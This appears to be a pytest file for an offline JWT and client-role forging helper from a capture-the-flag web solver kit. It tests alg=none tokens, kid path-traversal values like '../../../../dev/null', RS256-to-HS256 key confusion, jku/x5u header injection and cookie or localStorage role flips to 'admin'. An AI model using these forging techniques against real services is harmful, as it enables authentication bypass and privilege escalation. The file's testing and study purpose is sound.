#!/usr/bin/env python3
"""Synthetic, transport-free tests for the auth/JWT trust helper."""

from __future__ import annotations

import base64
import itertools
import json
import sys
import urllib.parse
from pathlib import Path

import pytest


REPO = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(REPO / "solvers" / "web"))
import auth_trust as auth  # noqa: E402


def b64u(raw: str) -> str:
    return base64.urlsafe_b64encode(raw.encode()).rstrip(b"=").decode()


def rsa_token(payload=None, kid="main"):
    header = {"alg": "RS256", "kid": kid, "typ": "JWT"}
    body = payload or {"sub": "7", "role": "user"}
    return f"{b64u(json.dumps(header, separators=(',', ':')))}.{b64u(json.dumps(body, separators=(',', ':')))}.AA"


def rsa_jwk(kid="main"):
    # Synthetic 1024-bit public value is enough to exercise bounded ASN.1/JWK
    # conversion; no private key operation occurs in this offline helper.
    modulus = b"\x80" + b"\x00" * 126 + b"\x01"
    return {
        "kty": "RSA",
        "kid": kid,
        "n": base64.urlsafe_b64encode(modulus).rstrip(b"=").decode(),
        "e": "AQAB",
    }


def test_hmac_inspect_confirmation_and_resign_are_caller_bounded():
    token = auth.forge_jwt({"sub": "7", "role": "user"}, key="delivery-secret", alg="HS256",
                           header={"kid": "primary"})
    decoded = auth.inspect_jwt(token)
    assert decoded["header"] == {"alg": "HS256", "kid": "primary", "typ": "JWT"}
    assert decoded["payload"] == {"role": "user", "sub": "7"}
    assert decoded["kid"] == "primary"
    assert decoded["verified"] is False
    assert decoded["network_requests"] == 0

    confirmation = auth.confirm_hmac_keys(token, ["nope", "delivery-secret"])
    assert confirmation["confirmed"] is True
    assert confirmation["tested"] == 2
    assert confirmation["matches"] == [{"index": 1, "key": "delivery-secret"}]
    assert auth.confirm_hmac_keys(token, ["nope"])["confirmed"] is False

    forged = auth.forge_from_token(token, key="delivery-secret", role="admin",
                                   overrides={"scope": "flag:read"})
    verified = auth.confirm_hmac_keys(forged["token"], ["delivery-secret"])
    changed = auth.inspect_jwt(forged["token"])
    assert verified["confirmed"] is True
    assert changed["payload"] == {
        "role": "admin", "scope": "flag:read", "sub": "7",
    }
    assert forged["candidate_only"] is True and forged["network_requests"] == 0


def test_alg_none_and_kid_candidates_preserve_explicit_evidence():
    captured = auth.forge_jwt({"uid": 12, "is_admin": False}, key="old", alg="HS384",
                              header={"kid": "ordinary.pem", "cty": "JWT"})
    unsigned = auth.forge_alg_none(captured, role="admin")
    decoded = auth.inspect_jwt(unsigned["token"])
    assert decoded["header"]["alg"] == "none"
    assert decoded["header"]["kid"] == "ordinary.pem"
    assert decoded["payload"]["is_admin"] is True
    assert decoded["signature_present"] is False
    assert unsigned["assumption"].startswith("the assigned target")

    rows = auth.forge_kid_candidates(
        captured, key="", kids=["../../../../dev/null", "..%2f..%2fdev%2fnull"], role="admin",
    )
    assert [row["rank"] for row in rows] == [1, 2]
    assert [auth.inspect_jwt(row["token"])["kid"] for row in rows] == [
        "../../../../dev/null", "..%2f..%2fdev%2fnull",
    ]
    assert all(auth.confirm_hmac_keys(row["token"], [""])["confirmed"] for row in rows)
    assert all(row["candidate_only"] and row["network_requests"] == 0 for row in rows)


def test_localstorage_and_cookie_role_flip_preserve_requested_encoding():
    rows = auth.forge_client_role(
        '{"name":"analyst","roles":["user"],"admin":false}',
        encoding="json", role="admin", storage_key="profile", cookie_name="profile",
    )
    assert [row["kind"] for row in rows] == ["local_storage_role_flip", "cookie_role_flip"]
    assert rows[0]["browser_operation"] == {
        "operation": "localStorage.setItem", "key": "profile", "value": rows[0]["value"],
    }
    payload = json.loads(rows[0]["value"])
    assert payload["roles"] == ["admin", "user"] and payload["admin"] is True
    assert rows[1]["request_header"] == {"Cookie": "profile=" + rows[1]["value"]}
    assert rows[1]["cookie_transport_encoding"] == "percent"
    assert json.loads(urllib.parse.unquote(rows[1]["value"])) == payload

    raw = b64u('{"role":"viewer"}')
    encoded = auth.forge_client_role(raw, encoding="base64url-json", storage_key="state")[0]
    decoded = base64.urlsafe_b64decode(encoded["value"] + "=" * (-len(encoded["value"]) % 4))
    assert json.loads(decoded) == {"role": "admin"}


def test_ambiguous_tokens_and_unbounded_candidate_sets_fail_closed():
    duplicate_header = b64u('{"alg":"HS256","alg":"none"}')
    payload = b64u('{"role":"user"}')
    with pytest.raises(auth.AuthInputError, match="duplicate JSON key"):
        auth.inspect_jwt(f"{duplicate_header}.{payload}.x")
    with pytest.raises(auth.AuthInputError, match="candidate-key cap"):
        auth.confirm_hmac_keys(auth.forge_jwt({"x": 1}, key="k"), ["k"] * 3, max_keys=2)
    with pytest.raises(auth.AuthInputError, match="caller-supplied key"):
        auth.confirm_hmac_keys(auth.forge_jwt({"x": 1}, key="k"), [])
    with pytest.raises(auth.AuthInputError, match="between 1 and"):
        auth.forge_kid_candidates(auth.forge_jwt({"x": 1}, key="k"), key="k", kids=[])
    with pytest.raises(auth.AuthInputError, match="invalid base64url"):
        auth.inspect_jwt("not+a.segment.signature")


def test_iterables_malformed_url_json_and_kid_alg_fail_closed():
    token = auth.forge_jwt({"role": "user"}, key="k")
    infinite_keys = ("not-k" for _ in itertools.count())
    with pytest.raises(auth.AuthInputError, match="candidate-key cap"):
        auth.confirm_hmac_keys(token, infinite_keys, max_keys=3)
    infinite_kids = (f"kid-{index}" for index in itertools.count())
    with pytest.raises(auth.AuthInputError, match="kid candidate cap"):
        auth.forge_kid_candidates(token, key="k", kids=infinite_kids, max_kids=2)
    with pytest.raises(auth.AuthInputError, match="not UTF-8"):
        auth.forge_client_role("%FF", encoding="url-json")
    with pytest.raises(auth.AuthInputError, match="only HS"):
        auth.forge_kid_candidates(token, key="k", kids=["/dev/null"], alg="RS256")


def test_plain_scalar_role_flip_and_cookie_name_validation():
    rows = auth.forge_client_role(
        "user", encoding="plain", role="admin", storage_key="role", cookie_name="role",
    )
    assert rows[0]["payload"] == "admin"
    assert rows[0]["browser_operation"]["value"] == "admin"
    assert rows[1]["request_header"] == {"Cookie": "role=admin"}
    with pytest.raises(auth.AuthInputError, match="RFC token"):
        auth.forge_client_role("user", encoding="plain", cookie_name="role;other")


def test_generic_role_descriptors_and_output_size_caps():
    rows = auth.forge_client_role('{"role":"user"}')
    assert rows[0]["name"] == "<storage-key>"
    assert "browser_operation_template" in rows[0]
    assert rows[1]["name"] == "<cookie-name>"
    assert rows[1]["request_header_template"].startswith("Cookie: <cookie-name>=")

    with pytest.raises(auth.AuthInputError, match="serialized role object"):
        auth.forge_client_role('{"role":"user"}', role="x" * (auth.MAX_CONTAINER_CHARS + 1))
    with pytest.raises(auth.AuthInputError, match="HMAC key"):
        auth.forge_jwt({"role": "user"}, key=10**6)
    with pytest.raises(auth.AuthInputError, match="exceeds"):
        auth.forge_jwt({"role": "user"}, key=b"k" * (auth.MAX_KEY_BYTES + 1))


def test_cli_prints_json_and_never_needs_a_target(capsys):
    token = auth.forge_jwt({"role": "user"}, key="known")
    assert auth.main(["hmac-confirm", token, "--key", "wrong", "--key", "known"]) == 0
    result = json.loads(capsys.readouterr().out)
    assert result["confirmed"] is True and result["network_requests"] == 0
    assert auth.main(["none", token, "--set", "admin=true"]) == 0
    result = json.loads(capsys.readouterr().out)
    assert auth.inspect_jwt(result["token"])["payload"]["admin"] is True


def test_rs_to_hs_confusion_accepts_exact_pem_and_canonical_jwks():
    captured = rsa_token()
    pem = auth.rsa_jwk_to_pem(rsa_jwk())
    assert pem.startswith(b"-----BEGIN PUBLIC KEY-----\n")
    assert pem.endswith(b"-----END PUBLIC KEY-----\n")

    exact = auth.forge_rs_hs_confusion(captured, pem, role="admin")
    assert exact["captured_algorithm"] == "RS256"
    assert exact["algorithm"] == "HS256"
    assert exact["public_key_source"] == "caller_supplied_pem_exact_bytes"
    assert exact["hmac_secret_length"] == len(pem)
    assert auth.confirm_hmac_keys(exact["token"], [pem])["confirmed"] is True
    decoded = auth.inspect_jwt(exact["token"])
    assert decoded["header"]["kid"] == "main"
    assert decoded["payload"]["role"] == "admin"

    jwks = {"keys": [rsa_jwk("main"), {**rsa_jwk("backup"), "kid": "backup"}]}
    from_jwks = auth.forge_rs_hs_confusion(captured, jwks, kid="main", role="operator")
    canonical = auth.rsa_jwk_to_pem(jwks["keys"][0])
    assert from_jwks["public_key_source"] == "jwks_canonical_spki_pem"
    assert auth.confirm_hmac_keys(from_jwks["token"], [canonical])["confirmed"] is True


def test_jwk_jku_x5u_header_injection_candidates_are_signed_but_never_fetched():
    captured = rsa_token()
    embedded = auth.forge_header_key_injection(
        captured, kind="jwk", key="delivery-test-key", kid="attacker", role="admin",
    )
    details = auth.inspect_jwt(embedded["token"])
    assert details["header"]["jwk"] == {
        "alg": "HS256", "k": b64u("delivery-test-key"), "kty": "oct", "use": "sig",
    }
    assert details["header"]["kid"] == "attacker"
    assert auth.confirm_hmac_keys(embedded["token"], ["delivery-test-key"])["confirmed"]
    assert embedded["network_requests"] == 0 and embedded["offline_only"] is True

    for mode in ("jku", "x5u"):
        row = auth.forge_header_key_injection(
            captured, kind=mode, key="known", url=f"https://keys.example/{mode}.json"
        )
        assert auth.inspect_jwt(row["token"])["header"][mode] == f"https://keys.example/{mode}.json"
        assert row["assumption"].endswith("when selecting a verification key")


def test_key_confusion_rejects_ambiguous_or_malformed_material():
    captured = rsa_token()
    with pytest.raises(auth.AuthInputError, match="exactly one RSA"):
        auth.forge_rs_hs_confusion(captured, {"keys": [rsa_jwk("a"), rsa_jwk("b")]})
    ordinary_hs = auth.forge_jwt({"role": "user"}, key="known")
    with pytest.raises(auth.AuthInputError, match="RSA/PS"):
        auth.forge_rs_hs_confusion(ordinary_hs, auth.rsa_jwk_to_pem(rsa_jwk()))
    with pytest.raises(auth.AuthInputError, match="absolute http"):
        auth.forge_header_key_injection(captured, kind="jku", key="x", url="file:///tmp/key")
    with pytest.raises(auth.AuthInputError, match="requires an explicit URL"):
        auth.forge_header_key_injection(captured, kind="x5u", key="x")
    with pytest.raises(auth.AuthInputError, match="512 and 16384"):
        auth.rsa_jwk_to_pem({"kty": "RSA", "n": "AQ", "e": "Aw"})


def test_key_confusion_cli_reads_only_explicit_local_material(tmp_path, capsys):
    pem = auth.rsa_jwk_to_pem(rsa_jwk())
    key_path = tmp_path / "server-public.pem"
    key_path.write_bytes(pem)
    captured = rsa_token()
    assert auth.main(["rs-hs", captured, "--public-key", str(key_path), "--set", "scope=flag:read"]) == 0
    result = json.loads(capsys.readouterr().out)
    assert result["network_requests"] == 0
    assert auth.confirm_hmac_keys(result["token"], [pem])["confirmed"] is True
    assert auth.main([
        "key-header", captured, "--kind", "jku", "--url", "https://keys.example/jwks.json",
        "--key", "known",
    ]) == 0
    result = json.loads(capsys.readouterr().out)
    assert auth.inspect_jwt(result["token"])["header"]["jku"] == "https://keys.example/jwks.json"

